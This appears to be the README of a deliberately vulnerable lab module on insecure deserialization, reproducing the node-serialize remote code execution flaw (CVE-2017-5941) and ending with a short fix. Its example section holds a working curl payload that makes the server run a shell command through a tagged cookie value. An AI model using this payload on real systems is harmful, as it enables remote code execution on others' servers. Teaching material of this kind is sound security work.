# 09 — Insecure Deserialization

Port: `3009`

Reproduces the public `node-serialize` RCE pattern (CVE-2017-5941): a
serialized value can be tagged as a function; on the way back in, the
deserializer detects that tag and falls back to `eval()` instead of
`JSON.parse()`.

## Vulnerable endpoint

- `GET /profile` — deserializes the `prefs` cookie set by `POST /set-prefs`.

## Example payload

```bash
curl -c c.txt -X POST http://localhost:3009/set-prefs \
  -H "Content-Type: application/json" \
  -d '{"theme":"_$$ND_FUNC$$_function (){ return require(\"child_process\").execSync(\"id\").toString() }()"}'

curl -b c.txt http://localhost:3009/profile
```

The response's `prefs.theme` contains the output of the `id` command,
executed server-side purely from a cookie value.

## What the fix would look like

Never eval() untrusted data. Use `JSON.parse` only, with no
function/marker fallback, and treat any client-supplied serialized state as
data, never as code.